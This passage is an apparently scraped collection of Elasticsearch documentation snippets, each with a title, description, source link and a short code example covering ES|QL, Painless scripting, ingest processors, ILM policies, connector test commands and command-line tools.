https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/enrich.csv-spec/enrich_with.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"1\"\n| ENRICH languages_policy ON a WITH language_name\n```\n\n----------------------------------------\n\nTITLE: Bitwise And with the Def Type in Painless\nDESCRIPTION: This snippet showcases the use of the bitwise and operator with the def type in Painless, illustrating the implicit casting and resulting values from the operation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_31\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 15 & 6; <1>\ndef y = x & 5;  <2>\n```\n\n----------------------------------------\n\nTITLE: Basic Sync Rule Configuration for Document Filtering\nDESCRIPTION: Demonstrates configuration of sync rules to include or exclude documents based on field conditions using comparison rules like equals, starts_with, regex, and numeric comparisons\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-sync-rules.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"field\": \"ID\",\n  \"rule\": \">\",\n  \"value\": 1000,\n  \"policy\": \"exclude\"\n}\n```\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"field\": \"state\",\n  \"rule\": \"regex\",\n  \"value\": \"[A-Z]{2}\",\n  \"policy\": \"exclude\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Trim Processor in Elasticsearch\nDESCRIPTION: Example configuration of a trim processor that removes leading and trailing whitespace from a field named 'foo'. The processor can be configured with various options like target field, error handling, and conditional execution.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/trim-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"trim\": {\n    \"field\": \"foo\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Response from ja_stop Token Filter Analysis\nDESCRIPTION: This snippet shows the response from the _analyze endpoint when using the custom analyzer with ja_stop filter. It demonstrates that the stopword 'ストップ' has been removed, leaving only the non-stopword token '消える' in the result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-stop.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"tokens\" : [ {\n    \"token\" : \"消える\",\n    \"start_offset\" : 5,\n    \"end_offset\" : 8,\n    \"type\" : \"word\",\n    \"position\" : 2\n  } ]\n}\n```\n\n----------------------------------------\n\nTITLE: Sorting Documents by Field Length Using Painless Script in Elasticsearch\nDESCRIPTION: This example demonstrates how to use a Painless script to sort search results based on the length of the 'theatre' field multiplied by a factor. It uses the _script sort option with a custom Painless script.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-sort-context.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"query\": {\n    \"term\": {\n      \"sold\": \"true\"\n    }\n  },\n  \"sort\": {\n    \"_script\": {\n      \"type\": \"number\",\n      \"script\": {\n        \"lang\": \"painless\",\n        \"source\": \"doc['theatre'].value.length() * params.factor\",\n        \"params\": {\n          \"factor\": 1.1\n        }\n      },\n      \"order\": \"asc\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Small-Scale E2E Testing for Microsoft Teams Connector\nDESCRIPTION: Command to run faster end-to-end tests with a smaller data set for the Microsoft Teams connector. This is useful for quicker verification during development.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-teams.md#2025-04-21_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=microsoft_teams DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Ordering Composite Aggregations in Elasticsearch\nDESCRIPTION: Shows how to specify custom ordering (ascending/descending) for different value sources in a composite aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_14\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [\n          { \"date\": { \"date_histogram\": { \"field\": \"timestamp\", \"calendar_interval\": \"1d\", \"order\": \"desc\" } } },\n          { \"product\": { \"terms\": { \"field\": \"product\", \"order\": \"asc\" } } }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Certificate Signing Requests with elasticsearch-certutil\nDESCRIPTION: This command generates certificate signing requests (CSRs) in silent mode using a YAML configuration file. It creates a compressed file containing CSR and private key files for each instance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/certutil.md#2025-04-21_snippet_5\n\nLANGUAGE: sh\nCODE:\n```\nbin/elasticsearch-certutil csr --silent --in instances.yml --out test2.zip --pass testpassword\n```\n\n----------------------------------------\n\nTITLE: ILM Allocate Action with Node Assignment and Replica Settings\nDESCRIPTION: Example of combining replica count configuration with node allocation requirements, setting one replica per shard and targeting cold nodes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-allocate.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"warm\": {\n        \"actions\": {\n          \"allocate\" : {\n            \"number_of_replicas\": 1,\n            \"require\" : {\n              \"box_type\": \"cold\"\n            }\n        }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Degrees to Radians in SQL\nDESCRIPTION: The RADIANS function converts a numeric expression from degrees to radians. It takes one numeric input and produces a double numeric output. Returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_46\n\nLANGUAGE: sql\nCODE:\n```\nRADIANS(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Computing Day of Week in Painless for Elasticsearch\nDESCRIPTION: This script retrieves the doc value for the 'datetime' field and determines the corresponding day of the week using the getDayOfWeekEnum function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-field-context.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\ndoc['datetime'].value.getDayOfWeekEnum().getDisplayName(TextStyle.FULL, Locale.ROOT)\n```\n\n----------------------------------------\n\nTITLE: Removing a Single Field with Remove Processor in Elasticsearch\nDESCRIPTION: Configuration example that demonstrates how to remove a single field named 'user_agent' from documents processed by an Elasticsearch ingest pipeline.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/remove-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"remove\": {\n    \"field\": \"user_agent\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Geo-bounding Box Query with Simple Vertex Parameters\nDESCRIPTION: This query demonstrates setting a bounding box's vertices using simple parameters: top, left, bottom, and right. Such configurations require latitude and longitude for each side, resulting in documents filtered by the spatial confines of the bounding box.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-bounding-box-query.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nGET my_locations/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_bounding_box\": {\n          \"pin.location\": {\n            \"top\": 40.73,\n            \"left\": -74.1,\n            \"bottom\": 40.01,\n            \"right\": -71.12\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch Nodes with Filters\nDESCRIPTION: Examples of using node filters with cluster APIs to select specific nodes based on various criteria such as name, address, role, or custom attributes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/api-conventions.md#2025-04-21_snippet_7\n\nLANGUAGE: sh\nCODE:\n```\n# If no filters are given, the default is to select all nodes\nGET /_nodes\n# Explicitly select all nodes\nGET /_nodes/_all\n# Select just the local node\nGET /_nodes/_local\n# Select the elected master node\nGET /_nodes/_master\n# Select nodes by name, which can include wildcards\nGET /_nodes/node_name_goes_here\nGET /_nodes/node_name_goes_*\n# Select nodes by address, which can include wildcards\nGET /_nodes/10.0.0.3,10.0.0.4\nGET /_nodes/10.0.0.*\n# Select nodes by role\nGET /_nodes/_all,master:false\nGET /_nodes/data:true,ingest:true\nGET /_nodes/coordinating_only:true\nGET /_nodes/master:true,voting_only:false\n# Select nodes by custom attribute\n# (for example, with something like `node.attr.rack: 2` in the configuration file)\nGET /_nodes/rack:2\nGET /_nodes/ra*:2\nGET /_nodes/ra*:2*\n```\n\n----------------------------------------\n\nTITLE: Add multiple settings to the keystore using stdin\nDESCRIPTION: Feeds setting values into the keystore via standard input, allowing automation or script-based configuration. Supports multiple settings, separated by newlines.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/elasticsearch-keystore.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ncat /file/containing/setting/value | bin/elasticsearch-keystore add --stdin the.setting.name.to.set\n```\n\n----------------------------------------\n\nTITLE: EQL Sequence Search with Missing Events in Elasticsearch\nDESCRIPTION: Shows how to use the '!' operator to match missing events in an EQL sequence search, with a maximum time span of 1 day.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"query\": \"\"\"\n    sequence with maxspan=1d\n      [ process where process.name == \"cmd.exe\" ]\n      ![ process where stringContains(process.command_line, \"ocx\") ]\n      [ file where stringContains(file.name, \"scrobj.dll\") ]\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Proxy Settings for Elasticsearch Plugin Installation on Unix\nDESCRIPTION: Demonstrates how to configure HTTP and HTTPS proxy settings for plugin installation on Unix-like systems by setting Java options through the CLI_JAVA_OPTS environment variable.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/_other_command_line_parameters.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nsudo CLI_JAVA_OPTS=\"-Dhttp.proxyHost=host_name -Dhttp.proxyPort=port_number -Dhttps.proxyHost=host_name -Dhttps.proxyPort=https_port_number\" bin/elasticsearch-plugin install analysis-icu\n```\n\n----------------------------------------\n\nTITLE: Calculating Percentile and Median in ESQL\nDESCRIPTION: This snippet demonstrates the usage of MV_PERCENTILE and MV_MEDIAN functions in ESQL. It creates a row with a multi-valued field 'values' and then calculates the 50th percentile (p50) and median of these values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_percentile.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW values = [5, 5, 10, 12, 5000]\n| EVAL p50 = MV_PERCENTILE(values, 50), median = MV_MEDIAN(values)\n```\n\n----------------------------------------\n\nTITLE: Querying and Sorting Date-Time Data in ESQL\nDESCRIPTION: This ESQL query filters records based on date_nanos and date fields, then sorts the results. It uses the MV_MIN function for comparison and demonstrates conversion between different date-time formats.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_date_nanos.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM date_nanos\n| WHERE MV_MIN(nanos) < TO_DATE_NANOS(\"2023-10-23T12:27:28.948Z\")\n    AND millis > \"2000-01-01\"\n| SORT nanos DESC\n```\n\n----------------------------------------\n\nTITLE: Creating a pipeline that keeps binary data\nDESCRIPTION: Example showing how to create a pipeline that keeps the original binary data by explicitly setting remove_binary to false, followed by document indexing and retrieval.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/attachment.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/attachment\n{\n  \"description\" : \"Extract attachment information including original binary\",\n  \"processors\" : [\n    {\n      \"attachment\" : {\n        \"field\" : \"data\",\n        \"remove_binary\": false\n      }\n    }\n  ]\n}\nPUT my-index-000001/_doc/my_id?pipeline=attachment\n{\n  \"data\": \"e1xydGYxXGFuc2kNCkxvcmVtIGlwc3VtIGRvbG9yIHNpdCBhbWV0DQpccGFyIH0=\"\n}\nGET my-index-000001/_doc/my_id\n```\n\n----------------------------------------\n\nTITLE: Output Document After JSON Processing with Target Field\nDESCRIPTION: Example of the document after the JSON processor has parsed the string_source field. The original field is preserved, and the parsed JSON structure is stored in json_target.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/json-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"string_source\": \"{\\\"foo\\\": 2000}\",\n  \"json_target\": {\n    \"foo\": 2000\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Keyword Repeat and Stemmer Filters in Elasticsearch\nDESCRIPTION: This snippet demonstrates an analyze API request that uses the keyword_repeat and stemmer filters to create stemmed and unstemmed tokens for the text 'jumping dog'. It shows how duplicate tokens can be created in the same position.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-remove-duplicates-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [\n    \"keyword_repeat\",\n    \"stemmer\"\n  ],\n  \"text\": \"jumping dog\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring ILM Policy with Enabled Migration\nDESCRIPTION: Example of an ILM policy that combines migration with allocate action to reduce replicas before moving to warm nodes. The migrate action is included explicitly though it's automatically performed by default.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-migrate.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"warm\": {\n        \"actions\": {\n          \"migrate\" : {\n          },\n          \"allocate\": {\n            \"number_of_replicas\": 1\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Strings to IP Addresses with CIDR Matching in ESQL\nDESCRIPTION: Demonstrates converting string literals to IP addresses using TO_IP() and validating them against a CIDR range. Shows successful conversion of a valid IP string and failed conversion of an invalid string that returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_ip.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW str1 = \"1.1.1.1\", str2 = \"foo\"\n| EVAL ip1 = TO_IP(str1), ip2 = TO_IP(str2)\n| WHERE CIDR_MATCH(ip1, \"1.0.0.0/8\")\n```\n\n----------------------------------------\n\nTITLE: Extracting ISO Day of Week with ISO_DAY_OF_WEEK in SQL\nDESCRIPTION: Extracts the day of the week from a date/datetime expression according to ISO 8601 standard (Monday as 1). Returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_57\n\nLANGUAGE: sql\nCODE:\n```\n\"ISO_DAY_OF_WEEK(datetime_exp) <1>\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT ISO_DAY_OF_WEEK(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS day;\\n\\n      day\\n---------------\\n1\\n\"\n```\n\n----------------------------------------\n\nTITLE: Defining Parameters for ESQL String Replacement Function\nDESCRIPTION: This snippet defines the parameters for an ESQL function that performs string replacement using regular expressions. It specifies three parameters: the input string, the regex pattern, and the replacement string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/replace.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`string`\n:   String expression.\n\n`regex`\n:   Regular expression.\n\n`newString`\n:   Replacement string.\n```\n\n----------------------------------------\n\nTITLE: Grant Object Schema for Security Config Change Events in Elasticsearch\nDESCRIPTION: Specifies the structure of a grant object in security configuration change events. It includes fields for the grant type, user information, and access token status.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_27\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\": <string>, \"user\": {\"name\": <string>, \"has_password\": <boolean>},\n\"has_access_token\": <boolean>}\n```\n\n----------------------------------------\n\nTITLE: Defining InterruptedException in Java\nDESCRIPTION: This snippet defines the java.lang.InterruptedException class, thrown when a thread is waiting, sleeping, or otherwise occupied, and the thread is interrupted, either before or during the activity. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_41\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.InterruptedException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Cluster State Task Management Restrictions\nDESCRIPTION: Forbidden unbatched cluster state task submissions that can cause performance and stability issues. Updates should be implemented in reusable executors.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-server-signatures.txt#2025-04-21_snippet_5\n\nLANGUAGE: java\nCODE:\n```\norg.elasticsearch.cluster.service.MasterService#submitUnbatchedStateUpdateTask(java.lang.String, org.elasticsearch.cluster.ClusterStateUpdateTask)\norg.elasticsearch.cluster.service.ClusterService#submitUnbatchedStateUpdateTask(java.lang.String, org.elasticsearch.cluster.ClusterStateUpdateTask)\n```\n\n----------------------------------------\n\nTITLE: Mapping Configuration for Elasticsearch SQL Functions Documentation\nDESCRIPTION: YAML configuration that maps a documentation page to its corresponding URL in the Elasticsearch reference guide. This mapping directs to the SQL functions page in the current version of Elasticsearch documentation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nmapped_pages:\n  - https://www.elastic.co/guide/en/elasticsearch/reference/current/sql-functions.html\n```\n\n----------------------------------------\n\nTITLE: Example Warning Log Message\nDESCRIPTION: This warning message indicates that self-hosted extraction service is enabled for the connector, but the required `extraction_service.host` field is missing from the connector's configuration. This results in no text being extracted during the sync.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\nExtraction service has been initialised but no extraction service configuration was found. No text will be extracted for this sync.\n```\n\n----------------------------------------\n\nTITLE: SHOW TABLES with Exact Pattern Matching\nDESCRIPTION: Demonstrates using LIKE clause with exact table name matching.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-tables.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nSHOW TABLES LIKE 'emp';\n```\n\n----------------------------------------\n\nTITLE: Adding Documents with Custom Analyzer for Version 6 in JSON\nDESCRIPTION: Inserts a document into the Elasticsearch index using the custom analyzer for version 6, with only the content field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_11\n\nLANGUAGE: json\nCODE:\n```\nPOST /index/_doc\n{\n  \"content\": \"Doc 1\"\n}\n```\n\n----------------------------------------\n\nTITLE: Grouping Examples with Parentheses in Regular Expressions\nDESCRIPTION: Examples showing how to use parentheses to group parts of a pattern and treat them as a single unit.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_9\n\nLANGUAGE: text\nCODE:\n```\nabc(def)?  # matches 'abc' and 'abcdef' but not 'abcd'\n```\n\n----------------------------------------\n\nTITLE: Performing End-to-End Testing - Shell Command\nDESCRIPTION: This shell command runs end-to-end tests for the Azure Blob Storage connector using the Elasticsearch connector framework. Use the 'NAME' parameter to specify the connector and 'DATA_SIZE' to modify the test data size for faster results. Ensure that 'make' utility and necessary permissions are available.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-azure-blob.md#2025-04-21_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n$ make ftest NAME=azure_blob_storage\n```\n\n----------------------------------------\n\nTITLE: Creating Index for Score Context\nDESCRIPTION: Creates an index with keyword and long field mappings for score context testing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"field\": {\n        \"type\": \"keyword\"\n      },\n      \"rank\": {\n        \"type\": \"long\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Example Usage of elasticsearch-syskeygen Command in Shell\nDESCRIPTION: This example demonstrates how to generate a system_key file in the default Elasticsearch config directory. The command is executed without any additional parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/syskeygen.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-syskeygen\n```\n\n----------------------------------------\n\nTITLE: Hybrid Semantic and Lexical Search Query\nDESCRIPTION: Demonstrates combining a lexical match query with a semantic query using a boolean should clause, with different boost levels to blend search results\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-semantic-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST my-index/_search\n{\n  \"size\" : 3,\n  \"query\": {\n    \"bool\": {\n      \"should\": [\n        {\n          \"match\": {\n            \"title\": {\n              \"query\": \"mountain lake\",\n              \"boost\": 1\n            }\n          }\n        },\n        {\n          \"semantic\": {\n            \"field\": \"title_semantic\",\n            \"query\": \"mountain lake\",\n            \"boost\": 2\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Ordering by Multi-Value Sub-aggregation in Elasticsearch\nDESCRIPTION: Example demonstrating bucket ordering using multi-value metrics sub-aggregation with playback statistics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"genres\": {\n      \"terms\": {\n        \"field\": \"genre\",\n        \"order\": { \"playback_stats.max\": \"desc\" }\n      },\n      \"aggs\": {\n        \"playback_stats\": { \"stats\": { \"field\": \"play_count\" } }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-match with most_fields Type\nDESCRIPTION: This snippet demonstrates the `most_fields` type in a multi_match query.  It searches for \"quick brown fox\" in the \"title\", \"title.original\", and \"title.shingles\" fields and combines the scores from each matching field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-multi-match-query.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"multi_match\" : {\n      \"query\":      \"quick brown fox\",\n      \"type\":       \"most_fields\",\n      \"fields\":     [ \"title\", \"title.original\", \"title.shingles\" ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Synopsis for elasticsearch-reconfigure-node Command\nDESCRIPTION: Shows the command-line syntax for the elasticsearch-reconfigure-node tool, including available options such as enrollment token, help, key-value pairs, silent mode, and verbose mode.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/reconfigure-node.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-reconfigure-node\n[--enrollment-token] [-h, --help] [-E <KeyValuePair>]\n[-s, --silent] [-v, --verbose]\n```\n\n----------------------------------------\n\nTITLE: Extracting Month of Year with MONTH_OF_YEAR in SQL\nDESCRIPTION: Extracts the month of the year from a date/datetime expression. Returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_61\n\nLANGUAGE: sql\nCODE:\n```\n\"MONTH(datetime_exp) <1>\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT MONTH_OF_YEAR(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS month;\\n\\n     month\\n---------------\\n2\\n\"\n```\n\n----------------------------------------\n\nTITLE: Installing VirtualBox Extension Pack\nDESCRIPTION: Command for downloading and installing the VirtualBox Extension Pack, which provides additional functionality like USB 2.0 and RDP support.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nwget http://download.virtualbox.org/virtualbox/4.2.6/Oracle_VM_VirtualBox_Extension_Pack-4.2.6-82870.vbox-extpack\n```\n\n----------------------------------------\n\nTITLE: Extracting Day of Month with DAY_OF_MONTH in SQL\nDESCRIPTION: Extracts the day of the month from a date/datetime expression. If the input is null, the function returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_52\n\nLANGUAGE: sql\nCODE:\n```\n\"DAY_OF_MONTH(datetime_exp) <1>\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DAY_OF_MONTH(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS day;\\n\\n      day\\n---------------\\n19\\n\"\n```\n\n----------------------------------------\n\nTITLE: Running Docker Image for S3 Connector - Shell\nDESCRIPTION: This shell script runs the Docker image for the Amazon S3 connector using specified configuration files. It assumes the necessary Docker network configurations are completed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-s3.md#2025-04-21_snippet_4\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Managing WriteField Objects\nDESCRIPTION: This snippet defines the 'WriteField' class, offering numerous methods for field manipulation in scripts, including the ability to get, set, and check the existence of field values, as well as deduplication and transformation capabilities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.update.txt#2025-04-21_snippet_4\n\nLANGUAGE: groovy\nCODE:\n```\nclass org.elasticsearch.script.field.WriteField {\n    String getName()\n    boolean exists()\n    WriteField move(def)\n    WriteField overwrite(def)\n    void remove()\n    WriteField set(def)\n    WriteField append(def)\n    boolean isEmpty()\n    int size()\n    Iterator iterator()\n    def get(def)\n    def get(int, def)\n    boolean hasValue(Predicate)\n    WriteField transform(Function)\n    WriteField deduplicate()\n    WriteField removeValuesIf(Predicate)\n    WriteField removeValue(int)\n    NestedDocument doc()\n    NestedDocument doc(int)\n    Iterable docs()\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Configuration Directory and File\nDESCRIPTION: This snippet creates a directory and a `config.yml` file to store Elasticsearch connector configurations. No specific dependencies are mentioned.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_11\n\nLANGUAGE: sh\nCODE:\n```\nmkdir -p ~/connectors-config\ntouch ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Addition Operator in Elasticsearch Script\nDESCRIPTION: Performs arithmetic addition on the `serial_event_id` field, comparing the result with a specific number. Implements the `add` function in an Elasticsearch scripting context to handle such calculations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_18\n\nLANGUAGE: Elasticsearch Painless\nCODE:\n```\nscript\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.eq(InternalEqlScriptUtils.add(X0,params.v1),params.v2)))\",\"params\":{\"v0\":\"serial_event_id\",\"v1\":2,\"v2\":-2147483647}}\n```\n\n----------------------------------------\n\nTITLE: Generating Dependency Verification Metadata with Gradle\nDESCRIPTION: Command to automatically generate SHA256 verification metadata for dependencies by running the precommit task with the write-verification-metadata flag.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/BUILDING.md#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n>./gradlew --write-verification-metadata sha256 precommit\n```\n\n----------------------------------------\n\nTITLE: ESQL ENRICH Command Syntax\nDESCRIPTION: Basic syntax structure for the ENRICH command showing the policy name, optional match field specification, and field selection with optional renaming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/enrich.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nENRICH policy [ON match_field] [WITH [new_name1 = ]field1, [new_name2 = ]field2, ...]\n```\n\n----------------------------------------\n\nTITLE: Configuring SSL Protocol and Cipher Settings\nDESCRIPTION: Settings to control SSL/TLS protocol versions, 